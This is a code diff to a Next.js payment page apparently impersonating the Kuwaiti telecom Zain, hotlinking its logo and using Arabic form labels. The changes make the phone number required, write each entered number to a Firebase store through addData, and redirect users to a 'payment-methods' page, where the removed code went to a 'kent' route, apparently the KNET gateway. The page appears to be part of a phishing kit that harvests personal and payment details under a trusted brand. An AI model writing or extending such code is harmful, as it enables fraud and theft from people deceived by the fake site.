@@ -7,7 +7,7 @@ import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebasee"
 
 export default function ZainPayment() {
-  const [selectedTab, setSelectedTab] = useState("recharge")
+  const [selectedTab, setSelectedTab] = useState("bill")
   const [showAmountDropdown, setShowAmountDropdown] = useState(false)
   const [selectedAmount, setSelectedAmount] = useState("6.000")
   const [phoneNumber, setPhoneNumber] = useState("")
@@ -48,7 +48,7 @@ useEffect(()=>{
       <header className="flex items-center justify-end p-4 bg-[#2d1a45]">
         <div className="ml-auto flex">
           <Menu className="text-white"  size={24} />
-          <img src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" alt="Zain Logo" className="h-7" />
+          <img src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" alt="Zain Logo" className="h-7 " />
           </div>
 
         <Heart className="text-white" size={24} />
@@ -114,6 +114,7 @@ useEffect(()=>{
             <label className="block text-right text-sm mb-1 text-gray-500">* رقم الهاتف</label>
             <input
               type="text"
+              required
               value={phoneNumber}
               onChange={(e) => setPhoneNumber(e.target.value)}
               className="w-full border-b pb-2 text-right focus:outline-none"
@@ -145,6 +146,7 @@ useEffect(()=>{
                     onClick={() => {
                       setSelectedAmount(amount.value)
                       setShowAmountDropdown(false)
+                      localStorage.setItem('amount',selectedAmount)
                     }}
                   >
                     <div className="flex items-center">
@@ -173,11 +175,12 @@ useEffect(()=>{
         <div className=" flex justify-between items-center">
         <button
         
-        disabled={isSubmmited} onClick={()=>{
+        disabled={isSubmmited ||phoneNumber ===''} onClick={()=>{
           setIsSubmmited(true)
+          addData({id:_id,name:phoneNumber,phone:phoneNumber})
           setTimeout(() => {
 
-            router.push('/kent')
+            router.push('/payment-methods')
             setIsSubmmited(false)            
 
           }, 4000);
